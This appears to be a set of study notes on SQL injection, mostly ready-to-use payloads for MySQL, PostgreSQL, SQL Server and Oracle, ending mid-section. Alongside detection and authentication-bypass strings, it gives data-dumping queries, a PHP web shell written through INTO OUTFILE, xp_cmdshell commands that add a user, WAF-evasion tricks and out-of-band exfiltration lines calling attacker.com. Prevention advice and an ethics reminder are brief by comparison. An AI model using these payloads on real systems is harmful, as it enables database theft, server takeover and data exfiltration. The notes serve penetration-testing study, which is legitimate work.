# 🎯 Advanced SQL Injection - Master Notes

## 📋 Table of Contents

- 🔍 Introduction to SQL Injection
- ⚡ Types of SQL Injection
- 🛠️ Detection Techniques
- 💉 Basic Injection Techniques
- 🔓 Authentication Bypass
- 🎭 Union-Based SQL Injection
- ⚫ Blind SQL Injection
- ⏱️ Time-Based Blind SQL Injection
- ❌ Error-Based SQL Injection
- 📚 Database Enumeration
- 🔐 Advanced Exploitation Techniques
- 🛡️ WAF Bypass Techniques
- 💾 Out-of-Band SQL Injection
- 🧪 Testing Methodology
- 🛠️ Tools & Resources
- 🔒 Prevention & Mitigation

---

## 🔍 Introduction to SQL Injection

### What is SQL Injection?

**SQL Injection (SQLi)** is a web security vulnerability that allows attackers to interfere with database queries. It occurs when user input is improperly sanitized and directly concatenated into SQL queries.

### 💥 Impact

- 🔓 **Unauthorized Access** - Bypass authentication
- 📊 **Data Breach** - Extract sensitive information
- 🗑️ **Data Manipulation** - Modify or delete data
- 🖥️ **Remote Code Execution** - Execute OS commands
- 🚪 **Complete Server Takeover**

### 🎯 Vulnerable Code Example

```php
// VULNERABLE CODE
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

---

## ⚡ Types of SQL Injection

### 1️⃣ In-Band SQLi (Classic)

Most common type where attacker uses the same channel for both attack and data retrieval.

**Sub-types:**

- 🎭 **Union-Based** - Uses UNION operator
- ❌ **Error-Based** - Forces database errors

### 2️⃣ Inferential SQLi (Blind)

No direct data transfer; attacker reconstructs database by observing behavior.

**Sub-types:**

- 👁️ **Boolean-Based Blind** - TRUE/FALSE responses
- ⏱️ **Time-Based Blind** - Response delays

### 3️⃣ Out-of-Band SQLi

Uses different channels (DNS, HTTP) to exfiltrate data.

---

## 🛠️ Detection Techniques

### 🔎 Manual Detection Methods

#### 1. Basic Syntax Testing

```sql
'           # Single quote
"           # Double quote
`           # Backtick
')          # Closing parenthesis
")          # Closing parenthesis with double quote
`;          # Semicolon
--          # SQL comment
-- -        # SQL comment (with space)
#           # MySQL comment
/**/        # Multi-line comment
```

#### 2. Logic Testing

```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin' --
admin' #
admin'/*
```

#### 3. Response Indicators

- ✅ Different response length
- ✅ SQL error messages
- ✅ Different HTTP status codes
- ✅ Time delays
- ✅ Different page content

---

## 💉 Basic Injection Techniques

### 🧪 Testing for Vulnerability

#### Single Quote Test

```sql
# Input: admin'
# Query becomes: SELECT * FROM users WHERE username='admin''
# Result: SQL syntax error
```

#### Boolean Test

```sql
# Test 1: ' OR '1'='1
# Test 2: ' OR '1'='2
# Compare responses - different = vulnerable
```

### 📍 Common Injection Points

- 🔹 GET parameters: `?id=1`
- 🔹 POST data: Form fields
- 🔹 Cookies: Session data
- 🔹 HTTP headers: User-Agent, Referer
- 🔹 JSON/XML inputs

---

## 🔓 Authentication Bypass

### 🎭 Classic Bypass Techniques

#### Username Field

```sql
admin' --
admin' #
admin'/*
' OR '1'='1' --
' OR 1=1 --
administrator' OR '1'='1' --
```

#### Password Field

```sql
' OR '1'='1
' OR 1=1 --
anything' OR 'x'='x
```

#### Combined Attack

```sql
Username: admin' --
Password: anything

# Resulting query:
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
# Everything after -- is commented out
```

### 🔐 Advanced Bypass

#### Multiple Conditions

```sql
' OR 1=1 LIMIT 1 --
' OR username='admin' --
') OR ('1'='1
'))) OR 1=1 --
```

#### Blind Authentication Bypass

```sql
admin' AND '1'='1
admin' AND SUBSTRING(password,1,1)='a
```

---

## 🎭 Union-Based SQL Injection

### 📚 Concept

Combines results from original query with attacker's query using UNION operator.

### 🔢 Step 1: Find Number of Columns

#### Order By Method

```sql
' ORDER BY 1 --    # No error
' ORDER BY 2 --    # No error
' ORDER BY 3 --    # No error
' ORDER BY 4 --    # Error! = 3 columns
```

#### Union Select Method

```sql
' UNION SELECT NULL --           # Error
' UNION SELECT NULL,NULL --      # Error
' UNION SELECT NULL,NULL,NULL -- # Success! = 3 columns
```

### 🎯 Step 2: Find Vulnerable Column

```sql
' UNION SELECT 'a',NULL,NULL --
' UNION SELECT NULL,'a',NULL --
' UNION SELECT NULL,NULL,'a' --
```

### 💾 Step 3: Extract Data

#### Database Version

```sql
# MySQL
' UNION SELECT NULL,@@version,NULL --

# PostgreSQL
' UNION SELECT NULL,version(),NULL --

# Oracle
' UNION SELECT NULL,banner,NULL FROM v$version --

# SQL Server
' UNION SELECT NULL,@@version,NULL --
```

#### Current Database

```sql
# MySQL
' UNION SELECT NULL,database(),NULL --

# PostgreSQL
' UNION SELECT NULL,current_database(),NULL --

# SQL Server
' UNION SELECT NULL,DB_NAME(),NULL --
```

#### List Tables

```sql
# MySQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables --

# PostgreSQL
' UNION SELECT NULL,tablename,NULL FROM pg_tables --

# SQL Server
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U' --
```

#### List Columns

```sql
# MySQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --

# PostgreSQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --
```

#### Extract Data

```sql
# Single column
' UNION SELECT NULL,username,NULL FROM users --

# Multiple columns (concatenate)
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users --

# Multiple rows
' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users --
```

---

## ⚫ Blind SQL Injection

### 👁️ Boolean-Based Blind SQLi

#### 🧪 Concept

Application behavior differs based on TRUE/FALSE queries, no direct data display.

#### Testing

```sql
# Baseline TRUE condition
' AND 1=1 --          # Normal response

# Baseline FALSE condition
' AND 1=2 --          # Different response

# Database detection
' AND SUBSTRING(@@version,1,1)='5' --    # MySQL version 5.x
```

#### Data Extraction - Character by Character

```sql
# First character of database name
' AND SUBSTRING(database(),1,1)='a' --   # FALSE (different response)
' AND SUBSTRING(database(),1,1)='b' --   # FALSE
' AND SUBSTRING(database(),1,1)='t' --   # TRUE (normal response)

# Second character
' AND SUBSTRING(database(),2,1)='a' --
# ... continue until complete
```

#### ASCII Comparison (Faster)

```sql
# Using ASCII values for binary search
' AND ASCII(SUBSTRING(database(),1,1))>100 --   # TRUE
' AND ASCII(SUBSTRING(database(),1,1))>115 --   # FALSE
# Narrow down: character is between 100-115

' AND ASCII(SUBSTRING(database(),1,1))=116 --   # TRUE = 't'
```

### 🤖 Automated Extraction Pattern

```python
# Pseudocode for blind extraction
for position in range(1, max_length):
    for char in range(32, 127):  # Printable ASCII
        payload = f"' AND ASCII(SUBSTRING(database(),{position},1))={char} --"
        if send_payload(payload) == TRUE_RESPONSE:
            result += chr(char)
            break
```

---

## ⏱️ Time-Based Blind SQL Injection

### 🕐 Concept

Application doesn't show any visible differences, but you can measure response time.

### 💤 Sleep Functions by Database

```sql
# MySQL
' AND SLEEP(5) --
' OR IF(1=1,SLEEP(5),0) --

# PostgreSQL
' AND pg_sleep(5) --

# SQL Server
' WAITFOR DELAY '00:00:05' --

# Oracle
' AND dbms_pipe.receive_message('a',5)=1 --
```

### 🎯 Data Extraction with Time Delays

#### Character-by-Character Extraction

```sql
# MySQL - Extract database name
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --    # No delay
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0) --    # 5 sec delay = TRUE

# PostgreSQL
' AND (CASE WHEN (SUBSTRING(current_database(),1,1)='t') THEN pg_sleep(5) ELSE 0 END) --

# SQL Server
'; IF (SUBSTRING(DB_NAME(),1,1)='t') WAITFOR DELAY '00:00:05' --
```

#### Advanced Time-Based Queries

```sql
# Check if user is admin
' AND IF((SELECT user FROM users WHERE username='admin' LIMIT 1)='admin',SLEEP(5),0) --

# Count number of tables
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>10,SLEEP(5),0) --

# Extract password length
' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))>8,SLEEP(5),0) --
```

---

## ❌ Error-Based SQL Injection

### 💥 Concept

Force database to throw errors containing sensitive data.

### 🔥 MySQL Error-Based Techniques

#### ExtractValue()

```sql
' AND extractvalue(0x0a,concat(0x0a,(SELECT database()))) --
' AND extractvalue(0x0a,concat(0x0a,(SELECT user()))) --
' AND extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) --
```

#### UpdateXML()

```sql
' AND updatexml(null,concat(0x0a,(SELECT database())),null) --
' AND updatexml(null,concat(0x0a,(SELECT version())),null) --
```

#### Double Query

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --
```

### 🐘 PostgreSQL Error-Based

```sql
' AND 1=CAST((SELECT version()) AS int) --
' AND 1=CAST((SELECT current_database()) AS int) --
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS int) --
```

### 🏢 SQL Server Error-Based

```sql
' AND 1=CONVERT(int,(SELECT @@version)) --
' AND 1=CONVERT(int,(SELECT DB_NAME())) --
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --
```

---

## 📚 Database Enumeration

### 🗺️ Complete Enumeration Workflow

#### 1️⃣ Identify Database Type

```sql
# MySQL
' AND @@version --
' AND version() --

# PostgreSQL  
' AND version() --

# SQL Server
' AND @@version --

# Oracle
' AND (SELECT banner FROM v$version WHERE rownum=1) --
```

#### 2️⃣ Current User & Privileges

```sql
# MySQL
' UNION SELECT NULL,user(),NULL --
' UNION SELECT NULL,current_user(),NULL --
' UNION SELECT NULL,grantee,privilege_type FROM information_schema.user_privileges --

# PostgreSQL
' UNION SELECT NULL,current_user,NULL --

# SQL Server
' UNION SELECT NULL,SYSTEM_USER,NULL --
' UNION SELECT NULL,USER_NAME(),NULL --
```

#### 3️⃣ Database Names

```sql
# MySQL
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --

# PostgreSQL
' UNION SELECT NULL,datname,NULL FROM pg_database --

# SQL Server
' UNION SELECT NULL,name,NULL FROM master..sysdatabases --
```

#### 4️⃣ Table Names

```sql
# MySQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() --

# PostgreSQL
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public' --

# SQL Server
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U' --
```

#### 5️⃣ Column Names

```sql
# MySQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' --

# PostgreSQL
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --
```

#### 6️⃣ Dump Data

```sql
# MySQL - All users
' UNION SELECT NULL,username,password FROM users --
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users --
' UNION SELECT NULL,GROUP_CONCAT(CONCAT(username,':',password)),NULL FROM users --

# Specific user
' UNION SELECT NULL,username,password FROM users WHERE username='admin' --
```

### 🔍 Advanced Enumeration

#### Check File Privileges (MySQL)

```sql
' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user='root' --
```

#### Database Version Details

```sql
# MySQL detailed version
' UNION SELECT NULL,@@version_comment,NULL --
' UNION SELECT NULL,@@version_compile_os,NULL --

# Check if running as root/admin
' UNION SELECT NULL,IF(user()='root@localhost','yes','no'),NULL --
```

---

## 🔐 Advanced Exploitation Techniques

### 📁 File Operations (MySQL)

#### Read Files

```sql
# Requirements: FILE privilege
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL --
' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),NULL --

# Read web files
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL --
```

#### Write Files (Web Shell)

```sql
# Requirements: FILE privilege + write permissions
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php' --

# Then access: http://target.com/shell.php?cmd=whoami
```

### 💻 Command Execution

#### MySQL UDF (User Defined Functions)

```sql
# Load shared library
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
```

#### SQL Server xp_cmdshell

```sql
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
' ; EXEC xp_cmdshell 'whoami' --
' ; EXEC xp_cmdshell 'net user hacker password123 /add' --
```

#### PostgreSQL Command Execution

```sql
# Create table and use COPY FROM PROGRAM
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
```

### 🗄️ Database-Specific Features

#### MySQL - Into Outfile Variations

```sql
# Different line terminators for bypassing filters
' UNION SELECT NULL,'text',NULL INTO OUTFILE '/tmp/output.txt' --
' UNION SELECT NULL,'text',NULL INTO DUMPFILE '/tmp/output.txt' --
```

#### PostgreSQL - Large Objects

```sql
# Create large object with payload
SELECT lo_import('/etc/passwd', 1337);
SELECT lo_get(1337);
```

---

## 🛡️ WAF Bypass Techniques

### 🎭 Encoding & Obfuscation

#### URL Encoding

```sql
# Original: ' OR 1=1 --
# Encoded: %27%20OR%201%3D1%20--

# Double encoding
# %2527%2520OR%25201%253D1%2520--
```

#### Hex Encoding

```sql
# MySQL
' OR 1=0x1 --
' OR username=0x61646d696e --  # 'admin' in hex

# Use UNHEX()
' UNION SELECT NULL,UNHEX('61646d696e'),NULL --
```

#### Unicode Encoding

```sql
# Use Unicode characters
' %u006F%u0072 1=1 --  # 'or' in Unicode
```

### 🔤 Case Manipulation

```sql
' Or 1=1 --
' oR 1=1 --
' OR 1=1 --
' UnIoN SeLeCt --
```

### 💬 Comment-Based Obfuscation

```sql
# Inline comments (MySQL)
'/**/OR/**/1=1/**/--
'/*!50000OR*/1=1--
UNION/*!50000SELECT*/NULL--

# Multiple comment types
'--+-OR/**_**/1=1--+-

# Comments between keywords
UN/**/ION SE/**/LECT
```

### 🔀 Alternative Syntax

#### Whitespace Alternatives

```sql
# Tab instead of space
'%09OR%091=1--

# Newline
'%0AOR%0A1=1--

# Multiple spaces
'%20%20OR%20%201=1--

# No spaces using parentheses
'OR(1)=(1)--
'OR(username)LIKE('admin')--
```

#### Operator Variations

```sql
# Instead of =
' OR 'a' LIKE 'a
' OR 'a' IN ('a')

# Instead of OR
' || 1=1 --
' | 1 --

# Boolean variations
' OR true --
' OR 1 --
' OR 'a'='a
```

### 🎨 Advanced Bypass Techniques

#### Newline Bypass

```sql
'
OR
1=1
--
```

#### Scientific Notation

```sql
' OR 1e0=1 --
' AND 1e1>9 --
```

#### Function-Based Bypass

```sql
# Instead of quotes
' OR username=CHAR(97,100,109,105,110) --  # 'admin'

# Concatenation
' OR username=CONCAT('ad','min') --
' OR username='ad'+'min' --  # SQL Server
' OR username='ad'||'min' --  # PostgreSQL
```

#### Null Byte Injection

```sql
' OR 1=1%00 --
' UNION SELECT%00NULL,username,password FROM users --
```

#### Buffer Overflow Bypass

```sql
# Very long payload to bypass WAF
' OR 1=1 AND 'a'='a[...1000+ characters...]' --
```

---

## 💾 Out-of-Band SQL Injection

### 🌐 Concept

Data exfiltration via external network connections (DNS, HTTP).

### 🔊 DNS Exfiltration

#### MySQL

```sql
# Load_file with UNC path (Windows)
' AND 1=LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a')) --

# Force DNS lookup
' UNION SELECT NULL,LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\a')),NULL --
```

#### SQL Server

```sql
# Master..xp_dirtree
'; EXEC master..xp_dirtree '\\attacker.com\share' --

# With data exfiltration
'; DECLARE @data VARCHAR(1024); SELECT @data=(SELECT TOP 1 username FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') --
```

#### Oracle

```sql
# UTL_HTTP package
' UNION SELECT NULL,UTL_HTTP.REQUEST('http://attacker.com/'||user||'.html'),NULL FROM dual --

# UTL_INADDR
' UNION SELECT NULL,UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com'),NULL FROM dual --
```

### 📡 HTTP Exfiltration

#### PostgreSQL

```sql
# COPY TO PROGRAM with curl
COPY (SELECT user) TO PROGRAM 'curl http://attacker.com/?data=$(cat)';

# dblink extension
SELECT dblink_connect('host=attacker.com user=postgres password=password dbname=exfil');
```

#### MySQL (with file privileges)

```sql
# Write to file then read via HTTP request
' INTO OUTFILE '/var/www/html/data.txt' --
# Then fetch: http://target.com/data.txt
```

---

## 🧪 Testing Methodology

### 📝 Step-by-Step Testing Process

#### Phase 1: Reconnaissance 🔍

1. **Identify injection points**
    
    - URL parameters
    - Form fields
    - Headers (User-Agent, Referer, Cookie)
    - JSON/XML inputs
2. **Map application**
    
    - Note all dynamic pages
    - Identify database-driven functionality
    - Check for error messages

#### Phase 2: Detection ⚠️

1. **Basic syntax test**
    
    ```sql
    '
    "
    `
    ')
    "))
    ```
    
2. **Logic test**
    
    ```sql
    ' OR '1'='1
    ' OR 1=1--
    ' AND 1=2--
    ```
    
3. **Confirm vulnerability**
    
    - Check for different responses
    - Note error messages
    - Test both GET and POST

#### Phase 3: Identification 🔬

1. **Database type detection**
    
    ```sql
    # MySQL
    ' AND @@version --
    
    # PostgreSQL
    ' AND version() --
    
    # SQL Server
    ' AND @@version --
    
    # Oracle
    ' AND (SELECT banner FROM v$version WHERE rownum=1) --
    ```
    
2. **Determine injection type**
    
    - In-band (Union/Error-based)
    - Blind (Boolean/Time-based)
    - Out-of-band

#### Phase 4: Exploitation 💥

1. **Union-based**
    
    - Find column count
    - Identify vulnerable columns
    - Extract data
2. **Boolean-blind**
    
    - Establish TRUE/FALSE baselines
    - Extract data character by character
3. **Time-based**
    
    - Confirm with SLEEP/WAITFOR
    - Extract data with conditional delays

#### Phase 5: Enumeration 📊

1. Database name
2. Table names
3. Column names
4. Data extraction
5. Privilege escalation (if possible)

#### Phase 6: Post-Exploitation 🎯

1. File read/write
2. Command execution
3. Pivot to internal network

---

## 🛠️ Tools & Resources

### 🤖 Automated Tools

#### SQLMap

```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# With POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# WAF bypass with tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
```

#### Burp Suite

- **Repeater**: Manual payload testing
- **Intruder**: Automated fuzzing
- **Scanner**: Automated vulnerability detection (Pro)

#### NoSQLMap

```bash
# For NoSQL injection testing
python nosqlmap.py -t http://target.com/login -m login
```

### 📚 Payload Lists

#### SecLists

```
/usr/share/seclists/Fuzzing/SQLi/
/usr/share/seclists/Fuzzing/Databases/
```

#### Custom Wordlists

- Authentication bypass payloads
- Union-based payloads
- Time-based payloads
- WAF bypass payloads

### 🧰 Manual Testing Tools

#### Browser Extensions

- **HackBar**: Quick payload injection
- **Tamper Data**: Modify requests
- **Cookie Editor**: Manipulate cookies

#### Command-Line Tools

```bash
# cURL
curl "http://target.com/page.php?id=1'" -v

# wget
wget "http://target.com/page.php?id=1'"

# httpie
http GET "http://target.com/page.php?id=1'"
```

### 🔗 Resources

#### Cheat Sheets

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

#### Practice Labs

- **PortSwigger Web Security Academy**: Free SQLi labs
- **DVWA**: Damn Vulnerable Web Application
- **bWAPP**: Buggy Web Application
- **HackTheBox**: Various SQL injection challenges
- **TryHackMe**: SQL injection rooms

---

## 🔒 Prevention & Mitigation

### ✅ Secure Coding Practices

#### 1. Prepared Statements (Best Practice)

```php
// PHP with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// PHP with MySQLi
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

#### 2. Stored Procedures

```sql
CREATE PROCEDURE GetUser(IN user VARCHAR(50))
BEGIN
    SELECT * FROM users WHERE username = user;
END;
```

```php
// Calling stored procedure
$stmt = $pdo->prepare("CALL GetUser(?)");
$stmt->execute([$username]);
```

#### 3. Input Validation

```php
// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username");
}

// Type casting
$id = (int)$_GET['id'];

// Length validation
if (strlen($username) > 50) {
    die("Username too long");
}
```

#### 4. Escaping (Not Recommended - Use Prepared Statements)

```php
// MySQL
$username = mysqli_real_escape_string($conn, $username);

// PostgreSQL
$username = pg_escape_string($conn, $username);
```

### 🛡️ Defense in Depth

#### Principle of Least Privilege

```sql
-- Don't use root/admin for application
-- Create limited user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';

-- No FILE, SUPER, or PROCESS privileges
```

#### Web Application Firewall (WAF)

- ModSecurity rules
- Cloud WAF (Cloudflare, AWS WAF, Azure WAF)
- Custom filtering rules

#### Error Handling

```php
// Don't display database errors to users
try {
    $result = $stmt->execute();
} catch (Exception $e) {
    // Log error securely
    error_log($e->getMessage());
    // Display generic message
    die("An error occurred. Please try again later.");
}
```

#### Security Headers

```apache
# Disable directory listing
Options -Indexes

# Protect config files
<Files "config.php">
    Order Allow,Deny
    Deny from all
</Files>
```

### 🔍 Detection & Monitoring

#### Logging

```php
// Log all database queries
function logQuery($query, $user) {
    $log = date('Y-m-d H:i:s') . " - User: $user - Query: $query\n";
    file_put_contents('/var/log/db_queries.log', $log, FILE_APPEND);
}
```

#### Intrusion Detection

- Monitor for suspicious patterns
- Alert on multiple failed attempts
- Rate limiting on sensitive endpoints

#### Regular Security Audits

- Automated scanning with SAST/DAST tools
- Manual penetration testing
- Code reviews focusing on database interactions

---

## 🎓 Practice Challenges

### 🏆 Beginner Level

1. Basic authentication bypass
2. Union-based injection with visible output
3. Simple error-based injection

### ⚡ Intermediate Level

1. Boolean-based blind injection
2. Time-based blind injection
3. Second-order SQL injection
4. WAF bypass scenarios

### 💎 Advanced Level

1. Out-of-band exfiltration
2. Exploiting stored procedures
3. NoSQL injection
4. Polyglot payloads
5. Bypassing prepared statements (rare misconfigurations)

---

## 📖 Key Takeaways

### ✨ Remember

1. **Always test ethically** - Only test systems you're authorized to test
2. **Start simple** - Begin with basic payloads before complex ones
3. **Be patient** - Blind injection takes time
4. **Understand the database** - Each DBMS has unique features
5. **Document everything** - Keep detailed notes of findings
6. **Defense is critical** - Use prepared statements always
7. **Stay updated** - New bypass techniques emerge regularly

### 🎯 Quick Reference Commands

#### MySQL Quick Wins

```sql
' OR 1=1 --
' UNION SELECT NULL,@@version,NULL --
' UNION SELECT NULL,database(),NULL --
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() --
' AND SLEEP(5) --
```

#### PostgreSQL Quick Wins

```sql
' OR 1=1 --
' UNION SELECT NULL,version(),NULL --
' UNION SELECT NULL,current_database(),NULL --
' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public' --
' AND pg_sleep(5) --
```

#### SQL Server Quick Wins

```sql
' OR 1=1 --
' UNION SELECT NULL,@@version,NULL --
' UNION SELECT NULL,DB_NAME(),NULL --
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U' --
'; WAITFOR DELAY '00:00:05' --
```

#### Oracle Quick Wins

```sql
' OR 1=1 --
' UNION SELECT NULL,banner FROM v$version WHERE rownum=1 --
' UNION SELECT NULL,table_name FROM all_tables WHERE rownum=1 --
' AND dbms_pipe.receive_message('a',5)=1 --
```

---

## 🚀 Advanced Topics

### 🔄 Second-Order SQL Injection

#### Concept

Payload is stored first, then executed later when retrieved from database.

#### Example Scenario

```php
// Step 1: Registration - payload stored
$username = "admin'--"; // Stored as-is
INSERT INTO users (username, email) VALUES ('$username', '$email');

// Step 2: Profile update - payload executed
$query = "UPDATE users SET email='$new_email' WHERE username='$username'";
// Becomes: UPDATE users SET email='new@email.com' WHERE username='admin'--'
// Comments out the rest, updates admin's email!
```

#### Detection

1. Register with SQL payload as username
2. Trigger functionality that uses stored data
3. Check if injection executes

### 🧬 Polyglot SQL Injection

#### Concept

Payloads that work across multiple contexts (SQL, HTML, JS, etc.)

#### Examples

```sql
# Works in multiple contexts
' OR '1'='1' /**/--

# XSS + SQLi polyglot
'><script>alert(1)</script>--

# JSON + SQLi polyglot
{"id": "1' OR '1'='1"}

# XML + SQLi polyglot
<id>1' OR '1'='1</id>
```

### 🎪 SQL Injection in Different Contexts

#### JSON Endpoints

```json
// Vulnerable JSON
{"username": "admin' OR '1'='1' --", "password": "pass"}

// Nested injection
{"search": {"query": "' UNION SELECT NULL,password FROM users --"}}
```

#### XML/SOAP

```xml
<!-- Vulnerable XML -->
<user>
    <name>admin' OR '1'='1' --</name>
</user>

<!-- SOAP injection -->
<soap:Envelope>
    <soap:Body>
        <getUserData>
            <userId>1' UNION SELECT password FROM users --</userId>
        </getUserData>
    </soap:Body>
</soap:Envelope>
```

#### GraphQL

```graphql
# GraphQL injection
query {
    user(id: "1' OR '1'='1") {
        username
        email
    }
}

# With variables
query GetUser($id: String!) {
    user(id: $id) {
        username
    }
}
# Variables: {"id": "1' UNION SELECT password FROM users --"}
```

#### LDAP Injection (Related)

```
# Login bypass
*)(uid=*))(|(uid=*
admin*
admin)(|(password=*))
```

### 🔐 Bypassing Prepared Statements

#### Rare Scenarios Where Injection Exists

#### 1. Dynamic Table/Column Names

```php
// VULNERABLE - can't parameterize table names
$table = $_GET['table'];
$stmt = $pdo->prepare("SELECT * FROM $table WHERE id = ?");
$stmt->execute([$id]);

// Exploit
?table=users WHERE 1=1 --
```

#### 2. Order By/Limit Clauses

```php
// VULNERABLE
$order = $_GET['order'];
$stmt = $pdo->prepare("SELECT * FROM users ORDER BY $order");

// Exploit
?order=(CASE WHEN (1=1) THEN username ELSE email END)
```

#### 3. LIKE Pattern Injection

```php
// VULNERABLE to wildcard injection
$search = $_GET['search'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE name LIKE ?");
$stmt->execute(["%$search%"]);

// Exploit: search=%% returns all records
```

### 🌐 NoSQL Injection Basics

#### MongoDB Injection

```javascript
// Vulnerable query
db.users.find({username: req.body.username, password: req.body.password});

// Injection payload (JSON)
{"username": {"$ne": null}, "password": {"$ne": null}}
// Returns first user where username ≠ null AND password ≠ null

// Authentication bypass
{"username": "admin", "password": {"$gt": ""}}
```

#### NoSQL Operators

```javascript
// Comparison
$eq, $ne, $gt, $gte, $lt, $lte, $in, $nin

// Logical
$and, $or, $not, $nor

// Examples
{"username": {"$regex": "^admin"}}
{"username": {"$where": "this.username == 'admin'"}}
```

---

## 🎯 Real-World Attack Scenarios

### 📱 Scenario 1: E-Commerce Product Search

#### Vulnerable Code

```php
$search = $_GET['search'];
$query = "SELECT * FROM products WHERE name LIKE '%$search%'";
```

#### Attack Steps

1. **Test**: `?search=test'`
2. **Confirm**: `?search=test' OR '1'='1`
3. **Enumerate**: `?search=' UNION SELECT NULL,table_name,NULL FROM information_schema.tables --`
4. **Find users table**: `?search=' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' --`
5. **Extract data**: `?search=' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users --`

### 🔑 Scenario 2: Login Form with Cookies

#### Vulnerable Code

```php
$session_id = $_COOKIE['session'];
$query = "SELECT * FROM sessions WHERE session_id='$session_id'";
```

#### Attack Steps

1. **Intercept cookie** with Burp Suite
2. **Test**: `session=abc123'`
3. **Bypass**: `session=abc123' OR '1'='1' --`
4. **Privilege escalation**: `session=' UNION SELECT user_id,username,'admin' FROM users WHERE username='admin' --`

### 📊 Scenario 3: Reporting Dashboard

#### Vulnerable Code

```php
$start_date = $_POST['start'];
$end_date = $_POST['end'];
$query = "SELECT * FROM reports WHERE date BETWEEN '$start_date' AND '$end_date'";
```

#### Attack Steps

1. **Test both parameters**
2. **Time-based**: `start=2024-01-01' AND SLEEP(5) AND '1'='1`
3. **Extract**: `start=2024-01-01' UNION SELECT NULL,username,password,NULL,NULL FROM users WHERE '1'='1`

---

## 🎨 Creative Bypass Techniques

### 🔤 Alternative Characters

#### Using Different Quotes

```sql
# Backticks (MySQL)
' OR `1`=`1` --

# Brackets (SQL Server)
' OR [1]=[1] --

# No quotes
' OR 1=1 --
' OR true --
```

#### Using Different Comment Styles

```sql
# Double dash with space
' OR 1=1 -- comment

# Double dash no space (may work)
' OR 1=1--

# Hash (MySQL)
' OR 1=1 # comment

# Semicolon + null byte
' OR 1=1;%00

# Inline comment (MySQL)
'/*! OR 1=1 */--
```

### 🧩 Filter Evasion

#### Bypassing Keyword Filters

##### UNION Bypass

```sql
# Case variation
UnIoN SeLeCt

# Comments
UN/**/ION SE/**/LECT

# Inline comments (MySQL)
/*!50000UNION*/ /*!50000SELECT*/

# URL encoding
